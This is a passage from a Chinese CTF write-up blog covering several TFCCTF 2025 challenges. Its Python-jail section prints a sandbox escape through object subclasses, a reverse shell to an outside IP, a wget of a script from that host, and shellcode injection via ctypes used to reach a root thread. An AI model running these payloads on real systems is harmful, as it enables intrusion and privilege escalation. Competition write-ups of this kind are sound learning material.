class="built_in">eval</span>(user_input, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_user_input</span>():</span><br><span class="line">    <span class="keyword">global</span> INPUT</span><br><span class="line">    <span class="comment"># drop priv level</span></span><br><span class="line">    libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">    syscall = libc.syscall</span><br><span class="line">    nobody_uid = pwd.getpwnam(<span class="string">&quot;nobody&quot;</span>).pw_uid</span><br><span class="line">    SYS_setresuid = <span class="number">117</span></span><br><span class="line">    syscall(SYS_setresuid, nobody_uid, nobody_uid, nobody_uid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_interpreter = interpreters.create()</span><br><span class="line">        INPUT = <span class="built_in">input</span>(<span class="string">&quot;Enter payload: &quot;</span>)</span><br><span class="line">        user_interpreter.call(safe_eval, INPUT)</span><br><span class="line">        user_interpreter.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = threading.Thread(target=safe_user_input)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> INPUT == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Some error occured&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 <strong>Python 3.14</strong> 的新特性 <strong>多重****解释器</strong>（<code>concurrent.interpreters</code>），在沙箱中执行用户输入代码。过了一些关键词，以及<code>builtins</code>被清空，所以很多的内置函数都不能使用，而且还被降权了，类似于ssti可以getshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&quot;popen&quot;</span>]</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls / -al&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.93/4444 0&gt;&amp;1&#x27;&quot;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>提权就很有意思了，常见的我们找suid位和进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;find / -user root -perm -4000 -print 2&gt;/dev/null&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ps -ef&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">Result: UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">root           8       1  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">root           9       8  2 03:38 ?        00:00:00 python3 /jail.py</span><br><span class="line">nobody        11       9  0 03:38 ?        00:00:00 /bin/sh -c ps -ef</span><br><span class="line">nobody        12      11  0 03:38 ?        00:00:00 ps -ef</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>并没发现什么，由于是在python里面降权，想到同一进程不同线程的权限问题，写个检测脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># file: thread_cred_audit.sh</span></span><br><span class="line"><span class="comment"># 用法：</span></span><br><span class="line"><span class="comment">#   1) 指定PID:   ./thread_cred_audit.sh 1234</span></span><br><span class="line"><span class="comment">#   2) 指定模式:   ./thread_cred_audit.sh &quot;python3 .*jail\.py&quot;</span></span><br><span class="line"><span class="comment">#   3) 默认尝试:   自动搜索 &quot;python3 .*jail.py&quot;</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">cyan</span></span>()  &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[36m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">yellow</span></span>()&#123; <span class="built_in">printf</span> <span class="string">&quot;\033[33m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">red</span></span>()   &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[31m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">bold</span></span>()  &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[1m%s\033[0m\n&quot;</span>   <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">pick_pid</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> arg=<span class="string">&quot;<span class="variable">$&#123;1:-&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">local</span> pid=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> =~ ^[0-9]+$ &amp;&amp; -e <span class="string">&quot;/proc/<span class="variable">$arg</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    pid=<span class="string">&quot;<span class="variable">$arg</span>&quot;</span></span><br><span class="line">  <span class="keyword">elif</span> [[ -n <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 通过模式找</span></span><br><span class="line">    <span class="built_in">local</span> line</span><br><span class="line">    line=<span class="string">&quot;<span class="subst">$(pgrep -af <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> | head -n1 || true)</span>&quot;</span></span><br><span class="line">    [[ -n <span class="string">&quot;<span class="variable">$line</span>&quot;</span> ]] &amp;&amp; pid=<span class="string">&quot;<span class="subst">$(awk &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$line</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 默认找 jail.py</span></span><br><span class="line">    <span class="built_in">local</span> line</span><br><span class="line">    line=<span class="string">&quot;<span class="subst">$(pgrep -af &#x27;python3 .*jail\.py&#x27; | head -n1 || true)</span>&quot;</span></span><br><span class="line">    [[ -n <span class="string">&quot;<span class="variable">$line</span>&quot;</span> ]] &amp;&amp; pid=<span class="string">&quot;<span class="subst">$(awk &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$line</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  [[ -z <span class="string">&quot;<span class="variable">$pid</span>&quot;</span> ]] &amp;&amp; &#123; red <span class="string">&quot;未找到目标进程。请传入 PID 或匹配模式。&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pid</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pid=<span class="string">&quot;<span class="subst">$(pick_pid <span class="string">&quot;<span class="variable">$&#123;1:-&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">[[ -r <span class="string">&quot;/proc/<span class="variable">$pid</span>/status&quot;</span> ]] || &#123; red <span class="string">&quot;无权读取 /proc/<span class="variable">$pid</span>/status（可能被 hidepid 或权限限制）&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"></span><br><span class="line">bold <span class="string">&quot;== 目标进程：PID <span class="variable">$pid</span> ==&quot;</span></span><br><span class="line">name=$(awk <span class="string">&#x27;/^Name:/&#123;print $2&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">uidline=$(awk <span class="string">&#x27;/^Uid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">gidline=$(awk <span class="string">&#x27;/^Gid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">threads=$(awk <span class="string">&#x27;/^Threads:/&#123;print $2&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Name: <span class="variable">$name</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Uid (R/E/S/FS): <span class="variable">$uidline</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Gid (R/E/S/FS): <span class="variable">$gidline</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Threads: <span class="variable">$threads</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">bold <span class="string">&quot;== 线程凭据一览 ==&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-8s %-12s %-12s %-8s %-s\n&quot;</span> <span class="string">&quot;TID&quot;</span> <span class="string">&quot;Uid(R/E/S)&quot;</span> <span class="string">&quot;Gid(R/E/S)&quot;</span> <span class="string">&quot;State&quot;</span> <span class="string">&quot;Comm&quot;</span></span><br><span class="line"><span class="built_in">declare</span> -A seen_euids=()</span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r d; <span class="keyword">do</span></span><br><span class="line">  tid=<span class="string">&quot;<span class="variable">$&#123;d##*/&#125;</span>&quot;</span></span><br><span class="line">  st=<span class="string">&quot;/proc/<span class="variable">$pid</span>/task/<span class="variable">$tid</span>/status&quot;</span></span><br><span class="line">  [[ -r <span class="string">&quot;<span class="variable">$st</span>&quot;</span> ]] || <span class="built_in">continue</span></span><br><span class="line">  <span class="built_in">read</span> ruid euid suid fsuid &lt; &lt;(awk <span class="string">&#x27;/^Uid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">read</span> rgid egid sgid fsgid &lt; &lt;(awk <span class="string">&#x27;/^Gid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  state=$(awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;/^State:/&#123;print $2&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">comm</span>=$(awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;/^Name:/&#123;print $2&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;%-8s %-12s %-12s %-8s %-s\n&quot;</span> <span class="string">&quot;<span class="variable">$tid</span>&quot;</span> <span class="string">&quot;<span class="variable">$ruid</span>/<span class="variable">$euid</span>/<span class="variable">$suid</span>&quot;</span> <span class="string">&quot;<span class="variable">$rgid</span>/<span class="variable">$egid</span>/<span class="variable">$sgid</span>&quot;</span> <span class="string">&quot;<span class="variable">$state</span>&quot;</span> <span class="string">&quot;<span class="variable">$comm</span>&quot;</span></span><br><span class="line">  seen_euids[<span class="string">&quot;<span class="variable">$euid</span>&quot;</span>]=1</span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(<span class="built_in">ls</span> -1 /proc/<span class="variable">$pid</span>/task)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">if</span> (( <span class="variable">$&#123;#seen_euids[@]&#125;</span> &gt; <span class="number">1</span> )); <span class="keyword">then</span></span><br><span class="line">  red <span class="string">&quot;⚠ 检测到不同的 EUID 存在于同一进程的不同线程中（线程级降权/不一致）——此为题目核心风险点。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  yellow <span class="string">&quot;未观察到 EUID 差异。但注意：竞态窗口仍可能瞬时存在，单次快照不代表绝对安全。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>靶机出网，传上去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">wget http://156.238.233.93:9999/1.sh</span><br><span class="line"></span><br><span class="line">nobody@b46f2ce4e8f7:/tmp$ pgrep -af <span class="string">&#x27;python3 .*jail\.py&#x27;</span></span><br><span class="line">pgrep -af <span class="string">&#x27;python3 .*jail\.py&#x27;</span></span><br><span class="line">1 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">521 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">522 python3 /jail.py</span><br><span class="line">nobody@b46f2ce4e8f7:/tmp$ ./1.sh 522</span><br><span class="line">./1.sh 522</span><br><span class="line">== 目标进程：PID 522 ==</span><br><span class="line">Name: python3</span><br><span class="line">Uid (R/E/S/FS): 0 0 0 0</span><br><span class="line">Gid (R/E/S/FS): 65534 65534 65534 65534</span><br><span class="line">Threads: 2</span><br><span class="line"></span><br><span class="line">== 线程凭据一览 ==</span><br><span class="line">TID      Uid(R/E/S)   Gid(R/E/S)   State    Comm</span><br><span class="line">522      0/0/0        65534/65534/65534 S (sleeping) python3</span><br><span class="line">523      65534/65534/65534 65534/65534/65534 S (sleeping) Thread-1 (safe_</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同一进程不同进程用shellcode打 <a href="https://ewontfix.com/17/#:~:text=Now">https://ewontfix.com/17/#:~:text=Now</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;ctypes=__import__(&#x27;ctypes&#x27;);m=__import__(&#x27;o&#x27;+&#x27;s&#x27;);libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b&#x27;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&#x27;;ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)&quot;</span>,().__class__.__base__.__subclasses__()[166].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h2><span id="discord-shenanigans-v5">DISCORD SHENANIGANS V5</span><a href="#discord-shenanigans-v5" class="header-anchor"></a></h2><p>根据题目描述，确定在dc的官方频道的announcement处藏了东西</p>
<p>所以直接将当时有的一些记录复制到notepad，发现其中一条信息后有奇怪的内容</p>
<p><img src="../images/2025-TFCCTF/10.png" alt="1"></p>
<p>推测应该是零宽字节隐写，这里丢给厨子可以看到只有两种零宽字节，用在线工具处理不出来</p>
<p>gpt搞个脚本解析一下即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将你的十六进制字符串放进来，用空格分开</span></span><br><span class="line">hex_string = <span class="string">&quot;20 e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c&quot;</span>  <span class="comment"># 省略部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转成 bytes</span></span><br><span class="line">bytes_data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(b, <span class="number">16</span>) <span class="keyword">for</span> b <span class="keyword">in</span> hex_string.split())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码成 Unicode 字符</span></span><br><span class="line">text = bytes_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立零宽字符映射：\u200B -&gt; &#x27;0&#x27;, \u200C -&gt; &#x27;1&#x27;</span></span><br><span class="line">mapping = &#123;<span class="string">&#x27;\u200B&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\u200C&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成二进制字符串</span></span><br><span class="line">binary_str = <span class="string">&#x27;&#x27;</span>.join(mapping.get(c, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按每8位分割并转换为 ASCII</span></span><br><span class="line">chars = [<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_str[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>)]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提取结果:&quot;</span>, result)</span><br></pre></td></tr></table></figure>

<h2><span id="blackbox">BLACKBOX</span><a href="#blackbox" class="header-anchor"></a></h2><p>固件分析，丢ida，发现是avr架构</p>
<p>ida没办法直接解析反汇编成伪代码</p>
<p>但由于这固件内容不多，可以直接分析有的内容，发现sub_BE是核心代码</p>
<p>ai分析发现是进行了简单的异或加密，异或0xa5，但是不确定密文的位置在哪里，直接把整个elf文件作为输入丢给赛博厨子，然后得到flag</p>
<p><img src="../images/2025-TFCCTF/11.png" alt="1"></p>
<h2><span id="cr00ney">CR00NEY</span><a href="#cr00ney" class="header-anchor"></a></h2><p>题目附件代码看起来比较多, 但是关键逻辑就几点</p>
<ol>
<li>&#x2F;app&#x2F;api&#x2F;admin&#x2F;route.js 是获取flag的地方 对应路由&#x2F;api&#x2F;admin</li>
<li>注册登录 </li>
<li>从给定的sftp服务器下载文件到本地, 并返回文件中的内容.  题目默认在本地开了一个sftp, 因此可以下载文件, 包括sqlite的.db文件并查看内容</li>
</ol>
<p>获取flag的地方</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!user || !user.<span class="property">admin</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden&#x27;</span> &#125;, &#123; <span class="attr">status</span>: <span class="number">403</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">ADMIN_FLAG</span> || <span class="string">&#x27;No flag set&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; flag &#125;);</span><br></pre></td></tr></table></figure>

<p>需要admin字段鉴权以确定是都能拿到flag, 去看users表结构</p>
<p><img src="../images/2025-TFCCTF/12.png" alt="1"></p>
<p>再看注册逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">POST</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = <span class="keyword">await</span> request.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(</span><br><span class="line">      &#123; <span class="attr">error</span>: <span class="string">&#x27;Missing username or password&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">status</span>: <span class="number">400</span> &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">initDb</span>();</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> <span class="title function_">openDb</span>();</span><br><span class="line">  <span class="keyword">const</span> hashedPassword = <span class="keyword">await</span> bcrypt.<span class="title function_">hash</span>(password, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">run</span>(</span><br><span class="line">      <span class="string">&#x27;INSERT INTO users (username, password) VALUES (?, ?)&#x27;</span>,</span><br><span class="line">      username,</span><br><span class="line">      hashedPassword</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(</span><br><span class="line">      &#123; <span class="attr">error</span>: <span class="string">&#x27;User already exists&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">status</span>: <span class="number">409</span> &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

